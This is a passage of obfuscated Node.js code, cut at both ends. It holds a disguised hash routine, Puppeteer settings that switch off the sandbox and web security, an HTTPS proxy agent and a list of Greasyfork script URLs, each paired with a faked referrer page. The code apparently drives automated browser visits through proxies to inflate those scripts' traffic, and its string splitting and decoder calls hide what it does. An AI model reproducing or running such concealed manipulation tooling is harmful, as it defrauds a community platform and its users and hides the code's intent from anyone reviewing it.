0x2)] << 0x1 * -0x1a6 + -0x1445 * -0x1 + 0x2a9 * -0x7) << -0x2 * 0xf9 + 0x11 * -0x3b + 0x2f1 * 0x2 | w >>> -0x2 * -0x2b2 + -0x1f * 0x13f + 0x2158) + (x & (y = y << -0x199a * 0x1 + -0x1 * -0x1869 + 0x14f | y >>> 0xae1 + 0x1605 + -0x1072 * 0x2) | ~x & z) + v + (-0x9465859a + 0x2db9aa4a * 0x3 + 0x386f * 0x1cd7b) + A[q + (0xda9 + -0x1342 * 0x1 + 0x59d)] << 0x2ad * -0xb + -0x15 * 0x1af + 0x40ca, x = x << 0x142c + 0x16d3 + -0x2ae1 | x >>> 0x2588 + 0x51e + -0x1 * 0x2aa4;
          for (; q < 0x6e6 + -0xba9 + 0x4eb; q += -0x16e5 * -0x1 + -0x8a7 * -0x1 + 0x481 * -0x7)
            v = (u = (w = (u = (x = (u = (y = (u = (z = (u = v << 0x1e67 + 0x92c * -0x3 + -0x2de | v >>> -0x7 * -0x2d1 + -0xf5 * -0x15 + -0x5 * 0x7f1) + (w ^ x ^ y) + z + (-0x55a0dc3c + 0x5f6cd24 + 0xbe83fab9) + A[q] << 0xa7f + 0xd * 0x95 + -0x2 * 0x908) << -0x12eb + -0x965 + 0x1 * 0x1c55 | z >>> -0x1a5 * 0x2 + -0x21ca + 0xc65 * 0x3) + (v ^ (w = w << 0x200 * -0x3 + 0x4 * 0x479 + -0xbc6 | w >>> -0x1 * 0x1622 + 0x4a * 0x1 + -0x1 * -0x15da) ^ x) + y + (-0x7f7c1b66 + -0xb61391d3 + -0xa * -0x2a0a8f49) + A[q + (-0x9e * 0xd + 0x36f * -0x1 + 0xb76)] << 0x196d * -0x1 + -0x3 * -0x4dc + 0xad9) << 0x145d + 0xa3f + 0xbf * -0x29 | y >>> 0x1ff2 + 0x3dd * -0x2 + 0x181d * -0x1) + (z ^ (v = v << -0x47 * -0x2f + 0x1379 + -0x2064 | v >>> 0x22d * -0x5 + -0x9 + -0x3 * -0x3a4) ^ w) + x + (-0x5f72f667 + 0xc5ee839d + 0x85e5e6b) + A[q + (-0x338 * 0x6 + -0x22c + -0xabf * -0x2)] << 0xd7 * 0x17 + 0x236b + -0x36bc) << -0x22 * -0x61 + 0x491 + 0x1 * -0x116e | x >>> 0x1e6a + 0x2a * -0x8e + -0x703) + (y ^ (z = z << 0xa47 * -0x1 + -0x45b * 0x3 + -0x4e * -0x4d | z >>> 0x2222 + 0xb + -0x222b) ^ v) + w + (0x1f079c * 0x4f9 + -0xb821edbc + 0x11b * 0x7f42f3) + A[q + (0x137e + 0x1 * -0xce9 + -0x692)] << -0x2a2 * 0x7 + -0x2096 + 0x3304) << 0x1 * 0x1477 + 0x259c + -0x3a0e | w >>> -0x274 + -0x5 * 0x37 + 0x6 * 0x9b) + (x ^ (y = y << 0x2ef * 0x8 + 0x9df + -0x3 * 0xb13 | y >>> -0x902 * -0x3 + -0x21e3 + 0x6df) ^ z) + v + (0x1 * 0xa2529529 + 0x26ac47b5 + 0x1 * -0x5a24f13d) + A[q + (-0x97b + -0x684 + 0x1003 * 0x1)] << -0x23 * -0xd1 + -0x1c * 0x53 + -0x137f, x = x << 0x2460 + 0x4 * 0xc5 + 0xbe * -0x35 | x >>> -0x1cf2 + -0x4 * -0x602 + 0x4ec;
          for (; q < 0x82 * -0x12 + 0x1 * -0x1561 + -0x1ec1 * -0x1; q += 0x11 * -0xa8 + 0x1 * -0x9b7 + 0x2fc * 0x7)
            v = (u = (w = (u = (x = (u = (y = (u = (z = (u = v << -0x13ad + -0x1acf + 0x2e81 | v >>> -0x1d61 + -0x3 * 0x6c9 + 0x31d7) + (w & x | w & y | x & y) + z - (-0x93f0e * -0x1605 + 0xca438a2 * 0xd + 0x42ca * -0x3d196) + A[q] << 0x83c * 0x3 + -0x226 + 0x1 * -0x168e) << 0x2 * 0x565 + -0x2385 * -0x1 + -0x2e4a | z >>> -0x4 * 0x7d3 + -0x1818 + 0x377f) + (v & (w = w << -0x6 * -0x216 + 0x1 * -0x2479 + -0x1813 * -0x1 | w >>> 0x25bd + -0x11da + 0x7 * -0x2d7) | v & x | w & x) + y - (0x13f514 * -0x91 + 0x909517e8 + 0x209e6d8 * -0xa) + A[q + (-0x11a3 + -0x1038 + 0xc5 * 0x2c)] << -0x2 * -0xf0b + 0x4 * -0x909 + 0x1 * 0x60e) << -0x1f5d + 0x7 * 0x34d + -0xd * -0xa3 | y >>> 0x1213 * 0x1 + -0x1a7e + 0x886) + (z & (v = v << 0x169 * 0x8 + 0x5a7 + 0x10d1 * -0x1 | v >>> -0x250f + -0x1dd9 * -0x1 + 0x738) | z & w | v & w) + x - (0xb4cc32a3 + -0xbdd9b611 + 0x79f1c692) + A[q + (0x751 * 0x1 + 0x107b + 0x15 * -0x122)] << 0x1d07 + 0xcc1 * 0x1 + 0xa72 * -0x4) << 0x2 * 0x101f + 0x7 * 0x517 + -0x43da | x >>> -0x1250 + -0x91e + 0x1b89 * 0x1) + (y & (z = z << -0xb70 + -0x46c + 0xffa | z >>> 0xfe3 + -0x1129 + 0x148) | y & v | z & v) + w - (-0x14c81d47 + 0x1 * 0x5c58512c + 0x29540f3f) + A[q + (-0x4d * 0xf + -0x12c1 + 0x1747)] << 0x2353 + 0x1 * -0x13e9 + -0xf6a) << 0xf32 + 0x276 * -0xb + 0xbe5 * 0x1 | w >>> 0x2 * 0xcb + -0x1961 + 0xa1 * 0x26) + (x & (y = y << 0xb * 0xaf + 0x1c7b + -0x23e2 | y >>> -0x1987 + -0x1 * -0x23ea + -0x1 * 0xa61) | x & z | y & z) + v - (-0x7ce90752 + 0x484251a4 + 0xa58af8d2) + A[q + (-0x1b5b * -0x1 + -0x1a36 + -0x121 * 0x1)] << 0x4c5 + -0x123e + 0xd79, x = x << 0x134f + 0x142 + 0x5 * -0x417 | x >>> -0x1561 + -0x105b * -0x1 + -0xe * -0x5c;
          for (; q < -0x6 * -0x18a + -0x1709 * -0x1 + -0x38d * 0x9; q += -0x14e * 0x16 + 0x121 * 0x21 + -0xe * 0x9c)
            v = (u = (w = (u = (x = (u = (y = (u = (z = (u = v << -0x1 * 0x23c6 + -0x207f + -0x2 * -0x2225 | v >>> -0x2617 + -0x2098 + 0x46ca) + (w ^ x ^ y) + z - (0x374743de + -0x2669 * 0x13ab7 + 0x5 * 0x91c71df) + A[q] << 0x1c * 0x22 + 0x195b + -0x1d13) << -0xb5 * -0x1 + -0x20e6 + 0x2036 | z >>> 0x1981 * 0x1 + -0x1216 + -0xd * 0x90) + (v ^ (w = w << 0x1b * 0x11f + -0x71 * -0x11 + -0x25a8 | w >>> -0xe4e * 0x1 + -0x1092 + -0x1ee2 * -0x1) ^ x) + y - (0x47662075 + 0x1b9fb7af + 0x2d6899fa * -0x1) + A[q + (-0x195d + -0x1387 * -0x1 + 0x5d7)] << 0x9d * 0xb + -0x16e6 + 0x1027) << 0x166 * 0xa + 0x185c * -0x1 + 0xa65 | y >>> -0x12 * 0x141 + -0x1 * -0x1636 + 0x77) + (z ^ (v = v << -0x242a + 0x2c7 + 0x2181 | v >>> -0x1514 + 0x1 * 0x1c98 + -0x782) ^ w) + x - (0x55 * -0x96ba73 + -0x3d413b89 * -0x1 + 0x2a67ead0) + A[q + (-0x17b0 * -0x1 + 0x1 * -0xb53 + -0xc5b * 0x1)] << -0x5 * -0x4c3 + -0x1af6 + 0x327) << -0x23c7 + -0x218f + 0x455b | x >>> 0xef6 + 0x1766 + -0x2641) + (y ^ (z = z << 0xe86 + -0xb1d * -0x3 + -0x2fbf | z >>> 0x1299 + 0x271 + -0x2 * 0xa84) ^ v) + w - (0x224f3d38 + -0x3ca64578 + 0x14a222b * 0x3e) + A[q + (-0x1bcb * -0x1 + 0x2359 * 0x1 + -0x3f21)] << 0x433 + 0x25 * 0x48 + 0xe9b * -0x1) << -0x15 * 0x16f + 0x15b9 + 0x867 | w >>> -0xf0 + 0x716 * 0x2 + -0x1 * 0xd21) + (x ^ (y = y << 0x10b0 + -0x1 * 0x1f21 + 0xe8f | y >>> -0x11 * -0x105 + -0x1e96 + 0x23 * 0x61) ^ z) + v - (-0x68f11ae7 + 0x480f203e + 0x3 * 0x1cd512f1) + A[q + (0x1f7f * 0x1 + -0x757 * -0x3 + 0x3580 * -0x1)] << -0x112 * 0x8 + -0x12f + -0x5 * -0x1f3, x = x << 0x1 * -0x1937 + -0x1 * 0x5ad + 0x1f02 | x >>> 0x2 * 0x11bf + 0x2011 * 0x1 + 0x1 * -0x438d;
          this['h0'] = this['h0'] + v << -0x20b5 + 0xcdb + 0x6 * 0x34f, this['h1'] = this['h1'] + w << 0x1 * 0x822 + 0x1abc + 0x22de * -0x1, this['h2'] = this['h2'] + x << 0x1ca * 0xd + 0x1 * 0xbdc + -0x9b * 0x3a, this['h3'] = this['h3'] + y << -0x9fc + -0x7f8 + 0x2fe * 0x6, this['h4'] = this['h4'] + z << 0x1 * -0x24ad + 0x4d8 + 0x1fd5;
        }
        ['hex']() {
          this['finalize']();
          var q = this['h0'],
            u = this['h1'],
            v = this['h2'],
            w = this['h3'],
            x = this['h4'];
          return e[q >> 0x6d9 * -0x3 + 0x7 * 0x4a9 + -0xbf8 & 0x21 * 0x51 + -0x241 * 0x8 + 0x7a6] + e[q >> -0x1c4c + 0xc3b + -0x24f * -0x7 & -0x1c38 + 0xd29 + -0xf1e * -0x1] + e[q >> -0x297 + 0x14 * -0x17f + -0x9 * -0x39f & -0xbd0 + 0x517 * 0x2 + 0x1b1] + e[q >> 0x433 + 0xca4 * 0x2 + -0x1d6b & 0x17 * 0x19e + -0x2229 + 0x2 * -0x17d] + e[q >> 0x60a + 0x1603 * -0x1 + 0x1005 & 0x8 * 0x1f3 + 0x4 * -0xd6 + 0x1 * -0xc31] + e[q >> 0x1 * -0x2149 + 0x257c + -0x42b & -0x1eff + -0x39d + 0x5 * 0x6ef] + e[q >> -0x21e6 * 0x1 + 0x1 * 0xb26 + 0x16c4 & -0x1405 * -0x1 + 0xc00 + 0x1 * -0x1ff6] + e[0x294 * -0xf + 0x51 * -0xd + 0x2ad8 & q] + e[u >> -0x20b5 + 0xf17 + -0x8dd * -0x2 & 0x71 * 0x1 + -0x3 * -0x357 + -0xa67] + e[u >> -0x10 * 0x264 + 0x11ba + -0x179 * -0xe & 0x24d + -0x4 * 0x88a + 0x1fea] + e[u >> -0x3dc + 0x1279 * 0x2 + -0x2102 & -0x2 * 0xc92 + 0x39 * 0xc + -0x1 * -0x1687] + e[u >> 0x3f * 0x1b + -0x7 * -0x2c5 + 0xc * -0x22a & -0x160d + -0x32d * -0x7 + 0x1f * -0x1] + e[u >> -0x12a8 + -0x261 + 0x1 * 0x1515 & 0x3 * 0x6cd + -0x10 * -0x100 + -0x2458] + e[u >> 0x3 * -0xa7e + -0x2306 + 0x4288 & 0x329 + -0x2293 + 0x1 * 0x1f79] + e[u >> -0xc6d * -0x3 + 0x1a4a + -0x3f8d & -0x2 * -0x63c + -0x1 * 0x485 + -0x7e4] + e[0x1 * -0x1ca5 + -0x4 * 0x81c + 0xb6 * 0x56 & u] + e[v >> 0x127c + 0x15a2 * 0x1 + -0x3 * 0xd56 & -0x22e3 + 0x89 * -0x47 + -0x1 * -0x48f1] + e[v >> -0x8c * -0x4 + 0x304 * -0x1 + 0xec & 0x12 * 0x5f + -0x1037 + 0x4cc * 0x2] + e[v >> -0xce6 + 0x1f80 + -0x1286 & 0x3 * 0xd5 + 0xca7 + -0xf17 * 0x1] + e[v >> -0x213d + -0x83 * 0x2b + 0x2 * 0x1ba7 & -0x60 * 0xc + -0x5e0 + 0xa6f] + e[v >> 0xbae + 0x8aa * -0x4 + 0x7 * 0x34a & -0x48e + 0x28a + 0x1 * 0x213] + e[v >> 0x3a * -0x1 + -0x395 + -0x3d7 * -0x1 & -0x1b31 + 0x1 * 0x1ff1 + -0x4b1] + e[v >> 0xc5f * -0x1 + 0x1 * -0x13 + -0x27e * -0x5 & -0x175 * -0x3 + 0x703 + 0xd * -0xdf] + e[-0x425 * 0x1 + 0xd1c + 0x39 * -0x28 & v] + e[w >> -0x1160 + -0x1 * -0x1e5d + -0x7 * 0x1d7 & -0xd01 * -0x1 + -0x24f0 + 0x17fe] + e[w >> -0x1 * -0x8ff + -0x1 * -0x2551 + -0x2e38 & -0x727 * -0x4 + -0x1269 + 0xa24 * -0x1] + e[w >> 0x11b0 * -0x1 + -0x36e + 0x1532 & 0x5 * -0x78b + 0xbd + -0x2509 * -0x1] + e[w >> -0x1491 + -0x1975 + 0x2e16 & -0xb46 + -0x2103 + -0xb16 * -0x4] + e[w >> 0x6d8 + 0x1362 + 0x6 * -0x45d & 0x5d + 0x4 * -0x199 + -0x29 * -0x26] + e[w >> 0x154c + 0x91 * 0x2b + -0x2d9f & 0xc7 * -0x1 + 0x1a5d + -0x1987] + e[w >> 0x2658 + -0x4d * -0x5b + -0x41b3 & -0x2a * -0x8e + -0x2464 + 0xd27] + e[-0x5db + 0x2373 + -0x1d89 * 0x1 & w] + e[x >> 0x1511 + 0x1692 + 0x1 * -0x2b87 & -0x7ff + -0x29 * -0x2c + 0x102 * 0x1] + e[x >> 0x1247 * 0x2 + 0xac3 * -0x2 + -0x3bc * 0x4 & 0x869 * -0x1 + 0x6 * -0x171 + 0xe * 0x139] + e[x >> -0xb5d * 0x3 + 0x1d6 + 0x2055 * 0x1 & -0x1894 + 0x7 * -0x466 + 0x376d] + e[x >> 0x1b41 + 0x1826 + -0x3357 & -0x1374 + 0x270e + 0x1 * -0x138b] + e[x >> 0xc5a + 0x2696 + -0x32e4 & -0x2 * 0xbf7 + 0x359 * 0x3 + 0xdf2] + e[x >> -0x358 + 0x8 * -0x46c + 0x26c0 & 0x1 * -0xd85 + 0xef * 0x11 + -0x24b] + e[x >> 0x13cd + 0xbf2 + -0x1fbb & 0xd7d * 0x2 + 0x21e8 + -0x3cd3] + e[0xa27 + 0x4f1 * -0x2 + -0x3 * 0x12 & x];
        }
        ['digest']() {
          this['finalize']();
          var q = this['h0'],
            u = this['h1'],
            v = this['h2'],
            w = this['h3'],
            x = this['h4'];
          return [
            q >> 0x1f * -0x28 + -0x231c + -0x2c * -0xe9 & 0x26 * -0x102 + 0x68a + -0x1 * -0x20c1,
            q >> 0xaec + -0x270e + 0x1c32 & -0x8b * 0x16 + 0x11a9 + -0x4b8,
            q >> -0xb5 * 0x11 + 0xb38 + 0xd5 & -0x1de2 + -0x8f + 0x1f70, -0x5 * -0x335 + 0x606 + -0x1510 & q,
            u >> -0x9f0 + -0x10fd * 0x1 + 0x1b05 & 0x6 * -0x2eb + -0x2226 + 0x34a7,
            u >> -0x23c4 + 0x1f03 * 0x1 + 0x1 * 0x4d1 & 0x1 * -0x1334 + -0xb9f + -0x2 * -0xfe9,
            u >> 0x593 * 0x3 + 0x182e + -0x1 * 0x28df & -0x2b * -0x56 + 0x1f4d + -0x2cc0, -0x353 + 0x92 + 0x3c * 0x10 & u,
            v >> -0x3 * 0x975 + 0x3b * -0x42 + 0x2bad & 0x12c2 + -0x14f * 0xb + -0x35e,
            v >> -0x16 * -0x14e + 0xfd * 0x12 + -0x2e6e & 0x3 * 0xad6 + 0xb * -0xe3 + -0x15c2,
            v >> 0x199a + -0x1 * -0x1d22 + -0x36b4 & -0x1 * 0x21b5 + 0x1650 + 0xc64,
            0xa02 + -0x2078 + 0x1775 & v,
            w >> 0x827 + -0x148d * -0x1 + 0x1 * -0x1c9c & -0x111d + 0x4 * -0x22d + 0x34 * 0x84,
            w >> 0x12db + -0xf1 * 0x5 + -0x6 * 0x259 & -0xe74 + -0xca9 + 0x1c1c,
            w >> -0x1311 + -0x4 * -0x248 + 0x9f9 & 0xc9f + -0x20e0 + 0xaa * 0x20,
            0x202d * 0x1 + 0x25a5 * 0x1 + -0x44d3 & w,
            x >> 0xa99 + 0x6db + 0x4 * -0x457 & -0xac0 + 0x96e + 0x251,
            x >> 0x18ae + 0xf2 * 0x1f + -0x2 * 0x1af6 & -0x3c4 + 0x5b6 * -0x1 + 0xa79,
            x >> 0x1a2c + 0x6b * 0x35 + -0x304b & -0x1 * 0x180f + 0x17d0 + 0x6a * 0x3, -0xd0 * 0x17 + -0x11bd * 0x2 + -0x20b * -0x1b & x
          ];
        }
        ['arrayBuffe' + 'r']() {
          var q, r;
          return this['finalize'](), q = new ArrayBuffer(0xb8 + -0x1c7f + -0x949 * -0x3), (r = new DataView(q))['setUint32'](-0x1 * -0x1933 + -0x24d8 + 0xb * 0x10f, this['h0']), r['setUint32'](-0x3 * -0xaee + -0x2260 + -0x52 * -0x5, this['h1']), r['setUint32'](-0x2a9 + -0x4b * 0x72 + 0x2417, this['h2']), r['setUint32'](-0x1c5e + -0xde9 * 0x1 + -0xb * -0x3d9, this['h3']), r['setUint32'](-0xe98 + -0x6e1 * -0x4 + -0xcdc, this['h4']), q;
        }
    }
    o['prototype']['toString'] = o['prototype']['hex'], o['prototype']['array'] = o['prototype']['digest'];
    const p = k();
    return p;
  })()),
  wait = f => new Promise(g => setTimeout(g, f)),
  {
    log: log,
    warn: warn
  } = console,
  {
    floor: floor,
    random: random,
    ceil: ceil,
    min: min
  } = Math,
  NETWORK_PATIENCE = -0x4f68 + -0x8 * -0x475 + 0xa0 * 0x91 + (-0x8a5 * -0x1 + 0xcc3 + -0x9b0) * random(),
  MM_NETWORK_PATIENCE = (-0x1db2 + 0x74d * -0x1 + 0x62b * 0x6) * NETWORK_PATIENCE,
  me = random()['toString'](0x371 + 0x1ba7 + -0x8 * 0x3e1)['substring'](-0x3 * -0xc93 + 0x470 + 0x1 * -0x2a25, -0xadb * -0x1 + -0x98f * 0x1 + 0xa1 * -0x2),
  pptOptions = {
    'headless': 0x0,
    'setDefaultNavigationTimeout': 0x0,
    'setDefaultTimeout': 0x0,
    'args': [
      '--no-sandb' + 'ox',
      '--disable-' + 'setuid-san' + 'dbox',
      '--disable-' + 'dev-shm-us' + 'age',
      '--disable-' + 'web-securi' + 'ty'
    ],
    'executablePath': '/../../../' + process['env']['PUPPETEER_' + 'EXECUTABLE' + '_PATH']
  },
  axios = require('axios'),
  fetch = require('node-fetch'),
  {
    HttpsProxyAgent: HttpsProxyAgent
  } = require('https-prox' + 'y-agent'),
  data = {
    'scriptTargets': [{
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/457024' + '-surviv-io' + '-xclient-b' + 'eta',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/surviv.i' + 'o'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/404065' + '-%E7%BD%91' + '%E9%A1%B5%' + 'E7%B2%BE%E' + '7%81%B5',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/51cto.co' + 'm'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/22545-' + 'anti-bd-re' + 'direct',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/baidu' + '.com?page=' + '4'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/385' + '044-zhihu-' + 'anonymous-' + 'users',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/zhihu' + '.com'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/302' + '36-zhihu-l' + 'ink-fix',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/zhihu' + '.com'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + aG(0x28) + 'pts/435948' + '-btb',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430335' + '-wb-script',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/zhihu.co' + 'm'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430572' + '-beautify-' + 'the-baidu-' + 'homepage',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/zhihu.co' + 'm'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/410781' + '-diep-io-a' + 'nti-afk-ti' + 'meout',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/1196-v' + 'iew-youtub' + 'e-tags',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/21012-' + 'youtubeext',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/20798-' + 'youtube-hi' + 'de-volume-' + 'control',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/9090-y' + 'outube-add' + '-video-id-' + 'text-field',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
      },
      {
        'url': aH(0x8, '9g$6') + 'easyfork.o' + 'rg/en/scri' + 'pts/20710-' + 'calm-down-' + 'youtube',
        'preRef': 'https://gr' + aG(0x1c) + 'rg/en/scri' + aG(0x17) + 'e/youtube.' + 'com?page=9'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/39544-' + 'youtube-po' + 'lymer-disa' + 'ble',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/412698' + '-youtube-a' + 'uto-skip-a' + 'ds',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/413965' + '-youtube-l' + 'ike-dislik' + 'e-video-an' + 'd-skip-ad-' + 'keyboard-s' + 'hortcuts-f' + 'ork-from-n' + 'erevar009',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/39919-' + 'youtube-su' + 'ggested-vi' + 'deo-hider-' + 'for-youtub' + 'e-classic',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/414756' + '-requestho' + 'ok',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/414876' + '-live-chat' + '-mod-calib' + 'er',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/40462-' + 'youtube-no' + '-resume',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/40517-' + 'youtube-re' + 'sume',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/415706' + '-moomoo-io' + '-remove-co' + 'okie-prefe' + 'rences-tab',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405955' + '-web-secur' + 'ity',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + aH(0xf, '6Mhq') + '-html5%E8%' + 'A7%86%E9%A' + '2%91%E6%92' + '%AD%E6%94%' + aI(0x25) + '8%E5%A2%9E' + '%E5%BC%BA%' + 'E8%84%9A%E' + '6%9C%AC',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/429635' + '-always-on' + '-focus',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/30310-' + 'removeads',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/455853' + '-%E7%BD%91' + '%E9%A1%B5%' + 'E8%AE%BF%E' + '9%97%AE%E5' + '%8A%A0%E9%' + '80%9F%E5%9' + '9%A8',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454941' + '-hcaptcha-' + 'captcha-so' + 'lver-by-no' + 'captchaai',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/discord.' + 'com'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/407994' + '-mope-io-a' + 'uto-dive-a' + 'uto-boost-' + 'see-people' + '-underwate' + 'r-see-invi' + 'sible-play' + 'ers-remove' + '-ads',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/mope.io'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424066' + '-pancake-m' + 'od-katana-' + 'musket-aut' + 'oheal-anti' + '-insta-sta' + 'rter-resou' + 'rces-and-m' + 'ore',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/429746' + '-best-moom' + 'oo-io-hack' + '-mod-2022-' + '2023',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + '-moomoo-io' + '-agar-io-s' + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + 'ng-soon',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456855' + '-anti-anti' + '-adblock-v' + '1-all-site' + 's',
        'preRef': aI(0x19) + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454134' + '-moomoo-io' + '-dune-mod-' + 'autoheal-a' + 'utobreak-f' + 'ast-and-mo' + 're',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424447' + '-xtaming-c' + 'lient-tami' + 'ng-io-hack' + 's',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/taming.i' + 'o'
      },
      {
